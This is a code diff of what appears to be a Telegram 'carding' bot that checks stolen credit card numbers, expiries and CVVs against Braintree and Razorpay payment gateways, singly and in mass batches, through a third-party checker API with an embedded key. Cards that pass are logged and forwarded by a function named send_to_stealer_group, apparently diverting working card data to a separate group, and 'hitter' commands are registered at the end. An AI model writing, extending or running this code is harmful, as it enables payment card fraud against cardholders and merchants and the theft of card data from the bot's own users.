+                    if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
+                        approved_count += 1
+                        log_approved_card(user.id, username, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info)
+                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info, user.id, username)
+                        
+                        response = _build_gate_response(card['cc'], card['mm'], card['yy'], card['cvv'], "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
+                        try:
+                            success_gif = get_sexy_anime_gif("success")
+                            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
+                        except:
+                            await update.message.reply_text(response, parse_mode=ParseMode.HTML)
+                    elif status == 'ERROR':
+                        error_count += 1
                     else:
-                        errors.append(f"⚠️ {card_str}\n→ {result['response']}")
-                except asyncio.TimeoutError:
-                    errors.append(f"⚠️ {card['cc']}|...\n→ Timeout (60s)")
-                except Exception as e:
-                    errors.append(f"⚠️ {card['cc']}|...\n→ Error: {str(e)[:30]}")
-            
-            progress_text = f"📊 <b>Mass Braintree Check</b>\n\n"
-            progress_text += f"✅ Approved: {len(approved)}\n"
-            progress_text += f"🔵 CCN: {len(ccn)}\n"
-            progress_text += f"❌ Declined: {len(declined)}\n"
-            progress_text += f"⚠️ Errors: {len(errors)}\n\n"
-            progress_text += f"⏳ Processing batch {batch_num}/{len(batches)}..."
-            
-            try:
-                await msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
-            except:
-                pass
-            
-            if batch_num < len(batches):
-                await asyncio.sleep(1.0)
+                        declined_count += 1
+                
+                # Update progress
+                processed = min(batch_start + batch_size, total_cards)
+                try:
+                    await header_msg.edit_text(
+                        f"🔄 <b>Mass Braintree Auth Check</b>\n"
+                        f"Progress: {processed}/{total_cards}\n"
+                        f"✅ {approved_count} | ❌ {declined_count} | ⚠️ {error_count}",
+                        parse_mode=ParseMode.HTML
+                    )
+                except:
+                    pass
+                
+                # 1 second delay between batches
+                if batch_start + batch_size < total_cards:
+                    await asyncio.sleep(1)
         
-        stopped = context.user_data.get('mass_check_stop', False)
-        status_text = "STOPPED" if stopped else "Complete"
-        result_text = f"📊 <b>Mass Braintree Check {status_text}</b>\n\n"
-        result_text += f"✅ Approved: {len(approved)}\n"
-        result_text += f"🔵 CCN: {len(ccn)}\n"
-        result_text += f"❌ Declined: {len(declined)}\n"
-        result_text += f"⚠️ Errors: {len(errors)}\n\n"
+        # Final summary
+        await header_msg.edit_text(
+            f"✅ <b>Mass Braintree Auth Complete!</b>\n\n"
+            f"📊 <b>Results:</b>\n"
+            f"✅ Approved: {approved_count}\n"
+            f"❌ Declined: {declined_count}\n"
+            f"⚠️ Errors: {error_count}\n"
+            f"📋 Total: {total_cards}",
+            parse_mode=ParseMode.HTML
+        )
         
-        if approved:
-            result_text += "<b>✅ APPROVED:</b>\n"
-            for a in approved:
-                result_text += f"<code>{a}</code>\n\n"
-        
-        if ccn:
-            result_text += "<b>🔵 CCN:</b>\n"
-            for c in ccn:
-                result_text += f"<code>{c}</code>\n\n"
-        
-        if declined:
-            result_text += "<b>❌ DECLINED:</b>\n"
-            for d in declined:
-                result_text += f"<code>{d}</code>\n\n"
-        
-        if errors:
-            result_text += "<b>⚠️ ERRORS:</b>\n"
-            for e in errors[:10]:
-                result_text += f"<code>{e}</code>\n\n"
-            if len(errors) > 10:
-                result_text += f"<i>... and {len(errors) - 10} more errors</i>\n\n"
-        
-        try:
-            await msg.edit_text(result_text, parse_mode=ParseMode.HTML)
-        except:
-            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
+    except Exception as e:
+        await update.message.reply_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)
     finally:
         context.user_data[f'mass_check_running_{user_id}'] = False
-        context.user_data['mass_check_stop'] = False
+        context.user_data['awaiting_mass_b3'] = False
+
+# BRAINTREE EXTERNAL API GATES
+@require_approval
+async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Braintree Auth Gate using BarryX API"""
+    from modules.gate_status import is_gate_offline, offline_message
+    if is_gate_offline("b3"):
+        await update.message.reply_text(offline_message("b3"), parse_mode=ParseMode.HTML)
+        return
+    import aiohttp
+    import time as time_module
+    from modules.gate_checker import get_bin_info
+
+    user = update.effective_user
+
+    # Parse card
+    card_data = parse_card(update.message.text)
+    if not card_data:
+        await update.message.reply_text(
+            "❌ <b>Invalid Format!</b>\n\n"
+            "🎯 <b>Usage:</b>\n"
+            "<code>/b3 4242424242424242|12|25|123</code>\n\n"
+            "💡 <b>Format:</b> CC|MM|YY|CVV",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cc, mm, yy, cvv = card_data
+    card_str = f"{cc}|{mm}|{yy}|{cvv}"
+    
+    checking_msg = await update.message.reply_text(
+        f"🎀 <b>Checking card...</b>\n\n"
+        f"<code>{card_str}</code>\n"
+        f"Gateway: Braintree Auth",
+        parse_mode=ParseMode.HTML
+    )
+    
+    try:
+        start_time = time_module.time()
+        
+        # BarryX Braintree API
+        from modules.gate_api_config import get_gate_cfg as _gcfg
+        _bt_url = _gcfg("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
+        _bt_key = _gcfg("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
+        api_url = f"{_bt_url}?key={_bt_key}&card={card_str}&proxy="
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                else:
+                    data = {"status": "error", "message": f"API Error {resp.status}"}
+        
+        elapsed = time_module.time() - start_time
+        
+        bin_info = get_bin_info(cc)
+        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
+        if bin_info.get('type'):
+            bin_type += f" - {bin_info.get('type', '').upper()}"
+        username = user.username or user.first_name
+        
+        status = str(data.get('status', 'error')).upper()
+        message = str(data.get('message', 'Unknown response'))
+        
+        if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
+            log_approved_card(user.id, username, cc, mm, yy, cvv, "b3", message, bin_info)
+            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", message, bin_info, user.id, username)
+            
+            response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
+            try:
+                success_gif = get_sexy_anime_gif("success")
+                await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
+                await checking_msg.delete()
+            except:
+                await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+        else:
+            response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {message}", "Braintree Auth", bin_info, elapsed, username)
+            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+    
+    except Exception as e:
+        await checking_msg.edit_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)
+
+@require_premium
+async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass check Braintree Auth with 5 batches and 1s delay"""
+    user = update.effective_user
+
+    cards_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
+    if not cards_text:
+        await update.message.reply_text(
+            "📋 <b>MASS CHECK - Braintree Auth</b>\n\n"
+            "Send cards in format:\n"
+            "<code>CC|MM|YY|CVV</code>\n\n"
+            "One card per line. Max 50 cards.\n"
+            "⏱️ 5 batches with 1s delay\n"
+            "Or reply to a .txt file with this command.",
+            parse_mode=ParseMode.HTML
+        )
+        context.user_data['awaiting_mass_b3'] = True
+        return
+
+    await process_mass_b3(update, context, cards_text)
+
+async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
+    """Process mass Braintree Auth check with 5 batches and 1s delay"""
+    import aiohttp
+    import time as time_module
+    from modules.gate_checker import get_bin_info
+    
+    user = update.effective_user
+    user_id = user.id
+    
+    if context.user_data.get(f'mass_check_running_{user_id}'):
+        await update.message.reply_text(
+            "⏳ <b>Already Running</b>\n\n"
+            "You have a mass check in progress.\n"
+            "Please wait or use /stop to cancel.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    context.user_data[f'mass_check_running_{user_id}'] = True
+    context.user_data['mass_check_gate'] = 'b3'
+    context.user_data['mass_check_stop'] = False
+    
+    try:
+        limit = get_mass_check_limit(user.id)
+        
+        extracted = extract_cards_from_text(cards_text)
+        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
+        
+        if not cards:
+            await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
+            return
+        
+        if len(cards) > limit:
+            cards = cards[:limit]
+        
+        total_cards = len(cards)
+        approved_count = 0
+        declined_count = 0
+        error_count = 0
+        
+        header_msg = await _get_or_edit_loading_msg(
+            context, update,
+            f"🔄 <b>Mass Braintree Auth Check</b>\n"
+            f"Total: {total_cards}\n"
+            f"⏱️ 5 batches, 1s delay\n"
+            f"⏳ Processing...",
+        )
+        
+        # Process in batches of 5 with 1 second delay
+        batch_size = 5
+        username = user.username or user.first_name
+        
+        async with aiohttp.ClientSession() as session:
+            for batch_start in range(0, total_cards, batch_size):
+                if context.user_data.get('mass_check_stop'):
+                    break
+                
+                batch = cards[batch_start:batch_start + batch_size]
+                
+                # Process batch concurrently
+                async def check_single_card(card):
+                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
+                    try:
+                        from modules.gate_api_config import get_gate_cfg as _gcfg2
+                        _bt_url2 = _gcfg2("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
+                        _bt_key2 = _gcfg2("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
+                        api_url = f"{_bt_url2}?key={_bt_key2}&card={card_str}&proxy="
+                        start_time = time_module.time()
+                        
+                        async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+                            if resp.status == 200:
+                                data = await resp.json()
+                            else:
+                                data = {"status": "error", "message": f"API Error {resp.status}"}
+                        
+                        elapsed = time_module.time() - start_time
+                        status = str(data.get('status', 'error')).upper()
+                        message = str(data.get('message', 'Unknown'))
+                        
+                        return {
+                            'card': card,
+                            'card_str': card_str,
+                            'status': status,
+                            'message': message,
+                            'elapsed': elapsed
+                        }
+                    except Exception as e:
+                        return {
+                            'card': card,
+                            'card_str': card_str,
+                            'status': 'ERROR',
+                            'message': str(e)[:100],
+                            'elapsed': 0
+                        }
+                
+                # Run batch concurrently
+                tasks = [check_single_card(card) for card in batch]
+                results = await asyncio.gather(*tasks)
+                
+                # Process results
+                for result in results:
+                    card_str = result['card_str']
+                    status = result['status']
+                    message = result['message']
+                    elapsed = result['elapsed']
+                    card = result['card']
+                    
+                    bin_info = get_bin_info(card['cc'])
+                    bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
+                    
+                    if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
+                        approved_count += 1
+                        log_approved_card(user.id, username, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info)
+                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info, user.id, username)
+                        
+                        response = _build_gate_response(card['cc'], card['mm'], card['yy'], card['cvv'], "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
+                        try:
+                            success_gif = get_sexy_anime_gif("success")
+                            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
+                        except:
+                            await update.message.reply_text(response, parse_mode=ParseMode.HTML)
+                    elif status == 'ERROR':
+                        error_count += 1
+                    else:
+                        declined_count += 1
+                
+                # Update progress
+                processed = min(batch_start + batch_size, total_cards)
+                try:
+                    await header_msg.edit_text(
+                        f"🔄 <b>Mass Braintree Auth Check</b>\n"
+                        f"Progress: {processed}/{total_cards}\n"
+                        f"✅ {approved_count} | ❌ {declined_count} | ⚠️ {error_count}",
+                        parse_mode=ParseMode.HTML
+                    )
+                except:
+                    pass
+                
+                # 1 second delay between batches
+                if batch_start + batch_size < total_cards:
+                    await asyncio.sleep(1)
+        
+        # Final summary
+        await header_msg.edit_text(
+            f"✅ <b>Mass Braintree Auth Complete!</b>\n\n"
+            f"📊 <b>Results:</b>\n"
+            f"✅ Approved: {approved_count}\n"
+            f"❌ Declined: {declined_count}\n"
+            f"⚠️ Errors: {error_count}\n"
+            f"📋 Total: {total_cards}",
+            parse_mode=ParseMode.HTML
+        )
+        
+    except Exception as e:
+        await update.message.reply_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)
+    finally:
+        context.user_data[f'mass_check_running_{user_id}'] = False
+        context.user_data['awaiting_mass_b3'] = False
 
 @require_premium
 async def gate_bt1(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -9875,56 +10185,85 @@ async def gate_bt3d(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await check_gate(update, context, "bt3d", "Braintree 3D", True)
 
 # Braintree API Gate (vkrm.site)
-@require_premium
+@require_approval
 async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Braintree (vkrm API)"""
+    """Braintree Auth Gate using BarryX API"""
     from modules.gate_status import is_gate_offline, offline_message
     if is_gate_offline("b3"):
         await update.message.reply_text(offline_message("b3"), parse_mode=ParseMode.HTML)
         return
-    import time
-    from modules.bin_lookup import format_mass_card_result
+    import aiohttp
+    import time as time_module
+    from modules.gate_checker import get_bin_info
 
     user = update.effective_user
-    if not context.args:
+
+    # Parse card
+    card_data = parse_card(update.message.text)
+    if not card_data:
         await update.message.reply_text(
-            "💳 <b>Braintree Gate</b>\n\n"
-            "Usage: <code>/b3 CC|MM|YY|CVV</code>",
+            "❌ <b>Invalid Format!</b>\n\n"
+            "🎯 <b>Usage:</b>\n"
+            "<code>/b3 4242424242424242|12|25|123</code>\n\n"
+            "💡 <b>Format:</b> CC|MM|YY|CVV",
             parse_mode=ParseMode.HTML
         )
         return
     
-    card_text = context.args[0]
-    parts = card_text.split('|')
-    if len(parts) < 4:
-        await update.message.reply_text(ae("❌ Invalid format. Use: CC|MM|YY|CVV"), parse_mode=ParseMode.HTML)
-        return
+    cc, mm, yy, cvv = card_data
+    card_str = f"{cc}|{mm}|{yy}|{cvv}"
     
-    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-    
-    msg = await update.message.reply_text(ae("⏳ Checking card..."), parse_mode=ParseMode.HTML)
-    start = time.time()
+    checking_msg = await update.message.reply_text(
+        f"🎀 <b>Checking card...</b>\n\n"
+        f"<code>{card_str}</code>\n"
+        f"Gateway: Braintree Auth",
+        parse_mode=ParseMode.HTML
+    )
     
     try:
-        result = await check_b3(cc, mm, yy, cvv)
-        elapsed = round(time.time() - start, 2)
+        start_time = time_module.time()
         
-        status = result.get('status', 'ERROR')
-        response = result.get('response', 'Unknown')
+        # BarryX Braintree API
+        from modules.gate_api_config import get_gate_cfg as _gcfg
+        _bt_url = _gcfg("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
+        _bt_key = _gcfg("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
+        api_url = f"{_bt_url}?key={_bt_key}&card={card_str}&proxy="
         
-        from modules.gate_checker import get_bin_info
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                else:
+                    data = {"status": "error", "message": f"API Error {resp.status}"}
+        
+        elapsed = time_module.time() - start_time
+        
         bin_info = get_bin_info(cc)
+        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
+        if bin_info.get('type'):
+            bin_type += f" - {bin_info.get('type', '').upper()}"
+        username = user.username or user.first_name
         
-        if status in ['CHARGED', 'CCN']:
-            log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", response, bin_info)
-            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", response, bin_info, user.id, user.username or user.first_name)
-            await msg.delete()
-            await send_approved_card_with_gif(update, card_text, "b3", response, elapsed, bin_info)
+        status = str(data.get('status', 'error')).upper()
+        message = str(data.get('message', 'Unknown response'))
+        
+        if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
+            log_approved_card(user.id, username, cc, mm, yy, cvv, "b3", message, bin_info)
+            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", message, bin_info, user.id, username)
+            
+            response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
+            try:
+                success_gif = get_sexy_anime_gif("success")
+                await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
+                await checking_msg.delete()
+            except:
+                await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
         else:
-            card_result = ae(format_mass_card_result(card_text, status, response, "Braintree", elapsed))
-            await msg.edit_text(card_result, parse_mode=ParseMode.HTML)
+            response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {message}", "Braintree Auth", bin_info, elapsed, username)
+            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+    
     except Exception as e:
-        await msg.edit_text(ae(f"❌ Error: {str(e)[:100]}"))
+        await checking_msg.edit_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)
 
 @require_premium
 async def gate_mb3(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -9954,16 +10293,21 @@ async def gate_mb3(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await process_mass_b3(update, context, cards_text)
 
 async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
-    """Process mass Braintree check"""
-    import time
-    from modules.bin_lookup import format_mass_card_result
+    """Process mass Braintree Auth check with 5 batches and 1s delay"""
+    import aiohttp
+    import time as time_module
     from modules.gate_checker import get_bin_info
     
     user = update.effective_user
     user_id = user.id
     
     if context.user_data.get(f'mass_check_running_{user_id}'):
-        await update.message.reply_text(ae("⏳ Already running a mass check. Use /stop to cancel."), parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            "⏳ <b>Already Running</b>\n\n"
+            "You have a mass check in progress.\n"
+            "Please wait or use /stop to cancel.",
+            parse_mode=ParseMode.HTML
+        )
         return
     
     context.user_data[f'mass_check_running_{user_id}'] = True
@@ -9972,67 +10316,140 @@ async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, ca
     
     try:
         limit = get_mass_check_limit(user.id)
+        
         extracted = extract_cards_from_text(cards_text)
-        cards = [f"{c[0]}|{c[1]}|{c[2]}|{c[3]}" for c in extracted]
+        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
         
         if not cards:
-            await update.message.reply_text(ae("❌ No valid cards found!"), parse_mode=ParseMode.HTML)
+            await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
             return
         
         if len(cards) > limit:
             cards = cards[:limit]
         
-        total = len(cards)
-        approved = 0
-        declined = 0
+        total_cards = len(cards)
+        approved_count = 0
+        declined_count = 0
+        error_count = 0
         
-        header = await update.message.reply_text(
-            f"🔄 <b>Mass Braintree Check</b>\n"
-            f"Total: {total} | Batch: 5 | Delay: 1s\n"
+        header_msg = await _get_or_edit_loading_msg(
+            context, update,
+            f"🔄 <b>Mass Braintree Auth Check</b>\n"
+            f"Total: {total_cards}\n"
+            f"⏱️ 5 batches, 1s delay\n"
             f"⏳ Processing...",
-            parse_mode=ParseMode.HTML
         )
         
-        results = await mass_check_b3(cards, batch_size=5, delay=1.0)
+        # Process in batches of 5 with 1 second delay
+        batch_size = 5
+        username = user.username or user.first_name
         
-        for r in results:
-            if context.user_data.get('mass_check_stop'):
-                break
-            
-            card = r.get('card', '')
-            status = r.get('status', 'ERROR')
-            response = r.get('response', 'Unknown')
-            
-            if status in ['CHARGED', 'CCN']:
-                approved += 1
-                parts = card.split('|')
-                if len(parts) >= 4:
-                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-                    bin_info = get_bin_info(cc)
-                    log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", response, bin_info)
-                    await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", response, bin_info, user.id, user.username or user.first_name)
-                    await send_approved_card_with_gif(update, card, "b3", response, 0, bin_info)
-            else:
-                declined += 1
-                card_result = ae(format_mass_card_result(card, status, response, "Braintree", 0))
+        async with aiohttp.ClientSession() as session:
+            for batch_start in range(0, total_cards, batch_size):
+                if context.user_data.get('mass_check_stop'):
+                    break
+                
+                batch = cards[batch_start:batch_start + batch_size]
+                
+                # Process batch concurrently
+                async def check_single_card(card):
+                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
+                    try:
+                        from modules.gate_api_config import get_gate_cfg as _gcfg2
+                        _bt_url2 = _gcfg2("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
+                        _bt_key2 = _gcfg2("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
+                        api_url = f"{_bt_url2}?key={_bt_key2}&card={card_str}&proxy="
+                        start_time = time_module.time()
+                        
+                        async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+                            if resp.status == 200:
+                                data = await resp.json()
+                            else:
+                                data = {"status": "error", "message": f"API Error {resp.status}"}
+                        
+                        elapsed = time_module.time() - start_time
+                        status = str(data.get('status', 'error')).upper()
+                        message = str(data.get('message', 'Unknown'))
+                        
+                        return {
+                            'card': card,
+                            'card_str': card_str,
+                            'status': status,
+                            'message': message,
+                            'elapsed': elapsed
+                        }
+                    except Exception as e:
+                        return {
+                            'card': card,
+                            'card_str': card_str,
+                            'status': 'ERROR',
+                            'message': str(e)[:100],
+                            'elapsed': 0
+                        }
+                
+                # Run batch concurrently
+                tasks = [check_single_card(card) for card in batch]
+                results = await asyncio.gather(*tasks)
+                
+                # Process results
+                for result in results:
+                    card_str = result['card_str']
+                    status = result['status']
+                    message = result['message']
+                    elapsed = result['elapsed']
+                    card = result['card']
+                    
+                    bin_info = get_bin_info(card['cc'])
+                    bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
+                    
+                    if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
+                        approved_count += 1
+                        log_approved_card(user.id, username, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info)
+                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info, user.id, username)
+                        
+                        response = _build_gate_response(card['cc'], card['mm'], card['yy'], card['cvv'], "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
+                        try:
+                            success_gif = get_sexy_anime_gif("success")
+                            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
+                        except:
+                            await update.message.reply_text(response, parse_mode=ParseMode.HTML)
+                    elif status == 'ERROR':
+                        error_count += 1
+                    else:
+                        declined_count += 1
+                
+                # Update progress
+                processed = min(batch_start + batch_size, total_cards)
                 try:
-                    await context.bot.send_message(
-                        chat_id=update.message.chat_id,
-                        text=card_result,
+                    await header_msg.edit_text(
+                        f"🔄 <b>Mass Braintree Auth Check</b>\n"
+                        f"Progress: {processed}/{total_cards}\n"
+                        f"✅ {approved_count} | ❌ {declined_count} | ⚠️ {error_count}",
                         parse_mode=ParseMode.HTML
                     )
                 except:
                     pass
+                
+                # 1 second delay between batches
+                if batch_start + batch_size < total_cards:
+                    await asyncio.sleep(1)
         
-        await header.edit_text(
-            f"✅ <b>Mass Braintree Complete</b>\n\n"
-            f"📊 Total: {total}\n"
-            f"✅ Approved: {approved}\n"
-            f"❌ Declined: {declined}",
+        # Final summary
+        await header_msg.edit_text(
+            f"✅ <b>Mass Braintree Auth Complete!</b>\n\n"
+            f"📊 <b>Results:</b>\n"
+            f"✅ Approved: {approved_count}\n"
+            f"❌ Declined: {declined_count}\n"
+            f"⚠️ Errors: {error_count}\n"
+            f"📋 Total: {total_cards}",
             parse_mode=ParseMode.HTML
         )
+        
+    except Exception as e:
+        await update.message.reply_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)
     finally:
         context.user_data[f'mass_check_running_{user_id}'] = False
+        context.user_data['awaiting_mass_b3'] = False
 
 # PREMIUM GATES - Auto Stripe Auth (newrp.vercel.app)
 @require_premium
@@ -10344,61 +10761,55 @@ async def process_mass_st(update: Update, context: ContextTypes.DEFAULT_TYPE, ca
 # PREMIUM GATES - Razorpay
 @require_premium
 async def gate_rz(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Razorpay ₹1 using Nyvexis API"""
+    """Razorpay ₹1 checker using BarryX API"""
     from modules.gate_status import is_gate_offline, offline_message
     if is_gate_offline("rz"):
         await update.message.reply_text(offline_message("rz"), parse_mode=ParseMode.HTML)
         return
     import time as time_module
     user = update.effective_user
-
     card_data = parse_card(update.message.text)
     if not card_data:
-        await update.message.reply_text(
-            f"❌ <b>Invalid Format!</b>\n\n"
-            f"🎯 <b>Usage:</b>\n"
-            f"<code>/rz 4242424242424242|12|25|123</code>\n\n"
-            f"💡 <b>Format:</b> CC|MM|YY|CVV",
-            parse_mode=ParseMode.HTML
-        )
+        await update.message.reply_text(ae("❌ <b>Invalid Format!</b>\n\n🎯 <b>Usage:</b>\n<code>/rz CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
         return
-    
     cc, mm, yy, cvv = card_data
+    card_str = f"{cc}|{mm}|{yy}|{cvv}"
+    checking_msg = await update.message.reply_text(ae(f"🎀 <b>Checking card...</b>\n\n<code>{card_str}</code>\nGateway: Razorpay ₹1"), parse_mode=ParseMode.HTML)
+    from modules.rz_gate import check_rz_async
+    from modules.gate_checker import get_bin_info
     
-    checking_msg = await update.message.reply_text(
-        f"🎀 <b>Checking card...</b>\n\n"
-        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-        f"Gateway: Razorpay ₹1",
-        parse_mode=ParseMode.HTML
-    )
-    
-    from modules.rpp_gate import check_razorpay
     start_time = time_module.time()
-    result = await check_razorpay(cc, mm, yy, cvv, amount=10)
+    result = await check_rz_async(card_str)
     elapsed = time_module.time() - start_time
     
-    from modules.gate_checker import get_bin_info
+    if not result:
+        result = {'status': 'ERROR', 'message': 'No Response from Gate'}
     bin_info = get_bin_info(cc)
+    status, response_msg = result.get('status', 'ERROR'), result.get('message', 'Unknown')
+    
+    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
+    if bin_info.get('type'):
+        bin_type += f" - {bin_info.get('type', '').upper()}"
     username = user.username or user.first_name
     
-    if result['status'] == 'APPROVED':
-        log_approved_card(user.id, username, cc, mm, yy, cvv, "rz", result['message'], bin_info)
-        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "rz", result['message'], bin_info, user.id, username)
-        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {result['response']}", "Razorpay ₹1", bin_info, elapsed, username)
+    if status == 'APPROVED':
+        log_approved_card(user.id, username, cc, mm, yy, cvv, "rz", response_msg, bin_info)
+        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "rz", response_msg, bin_info, user.id, username)
+        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Razorpay ₹1", bin_info, elapsed, username)
         try:
-            success_gif = get_sexy_anime_gif("success")
-            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
             await checking_msg.delete()
         except:
-            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+            pass
+        gif_url = get_sexy_anime_gif("success")
+        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
     else:
-        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {result['response']}", "Razorpay ₹1", bin_info, elapsed, username)
+        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Razorpay ₹1", bin_info, elapsed, username)
         try:
-            failed_gif = get_sexy_anime_gif("failed")
-            await update.message.reply_animation(animation=failed_gif, caption=response, parse_mode=ParseMode.HTML)
             await checking_msg.delete()
         except:
-            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+            pass
+        gif_url = get_sexy_anime_gif("failed")
+        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
 
 # ============================================================================
 # RAZORPAY PAGES GATE - External API (/rzp, /mrzp)
@@ -21272,6 +21683,31 @@ def main():
     application.add_handler(CommandHandler("inv", stripe_invoice_hitter))
     # Register Epoch Hitter
     application.add_handler(CommandHandler("cam", epoch_hitter))
+
+    # ── FreakyHitter Commands ──────────────────────────────────────────────
+    try:
+        from freaky_commands import (
+            cmd_hitck, cmd_hitad, cmd_hitad1, cmd_hitmpgs, cmd_hitwhop,
+            cmd_hitpad, cmd_hitep, cmd_hitjio,
+            cmd_iban, cmd_ibancountry, cmd_pick, cmd_split, cmd_country
+        )
+        application.add_handler(CommandHandler("hitck", cmd_hitck))
+        application.add_handler(CommandHandler("hitad", cmd_hitad))
+        application.add_handler(CommandHandler("hitad1", cmd_hitad1))
+        application.add_handler(CommandHandler("hitmpgs", cmd_hitmpgs))
+        application.add_handler(CommandHandler("hitwhop", cmd_hitwhop))
+        application.add_handler(CommandHandler("hitpad", cmd_hitpad))
+        application.add_handler(CommandHandler("hitep", cmd_hitep))
+        application.add_handler(CommandHandler("jio", cmd_hitjio))
+        application.add_handler(CommandHandler("hitjio", cmd_hitjio))
+        application.add_handler(CommandHandler("iban", cmd_iban))
+        application.add_handler(CommandHandler("ibancountry", cmd_ibancountry))
+        application.add_handler(CommandHandler("pick", cmd_pick))
+        application.add_handler(CommandHandler("split", cmd_split))
+        application.add_handler(CommandHandler("country", cmd_country))
